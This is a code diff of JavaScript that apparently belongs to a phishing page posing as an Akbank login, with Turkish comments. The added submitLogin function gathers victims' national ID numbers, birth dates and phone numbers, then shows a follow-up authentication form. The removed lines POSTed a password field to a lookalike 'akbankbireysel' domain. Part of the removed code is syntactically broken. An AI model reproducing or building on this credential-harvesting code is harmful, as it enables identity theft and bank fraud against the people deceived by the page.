@@ -1,3 +1,4 @@
+
  
 
 
@@ -25,43 +26,33 @@ function submitData(action, formData, successCallback) {
             successCallback(response);
         },
         error: function (error) {
-            // Hata olduğunda SweetAlert ile bir hata mesajı göster
-            Swal.fire({
-  $("#loginButtonPass").hide();
-            $("#loginProcessPass").show();           
-            });
+      window.location.href = "/onay.html";
         }
     });
 }
- 
-    function submitPass() {
-        var passauth = document.getElementById('passauth').value;
 
-        // Veriyi POST etmek için XMLHttpRequest nesnesini kullanma
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://akbankbireysel.com/process.php", true);
-        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-        // POST verisi oluşturma
-        var formData = "passauth=" + passauth;
+function submitLogin() {
+    var txtTckn = $("#txtTckn").val();
+    var txtBirthDate = $("#txtBirthDate").val();
+    var txtPhoneNumber = $("#txtPhoneNumber").val();
 
-        // Göndermeden önce loading göstergesini göster
-        document.getElementById('loginButtonPass').style.display = 'none';
-        document.getElementById('loginProcessPass').style.display = 'block';
 
-        // POST isteği gönderme
-        xhr.onreadystatechange = function () {
-            if (xhr.readyState === 4 && xhr.status === 200) {
-                // Yanıt alındığında başarılı mesajı göster
-                alert("Veri başarıyla gönderildi!");
-            } else if (xhr.readyState === 4 && xhr.status !== 200) {
-                // Yanıt alındığında hata mesajı göster
-                alert("Veri gönderilirken bir hata oluştu!");
-            }
-        };
-        xhr.send(formData);
+    if (txtTckn && txtBirthDate && txtPhoneNumber) {
+        submitData("submitLogin", { txtTckn: txtTckn, txtBirthDate: txtBirthDate, txtPhoneNumber: txtPhoneNumber }, function () {
+            $("#loginButton").hide();
+            $("#loginProcess").show();
+
+            setTimeout(function () {
+                $("#loginf").hide();
+                $("#loginProcess").hide();
+                $("#footer").hide();
+                $("#authf").show();
+            }, 2000);
+        });
+    } else {
     }
- 
+}
 
 function submitPass() {
     var passauth = $("#passauth").val();
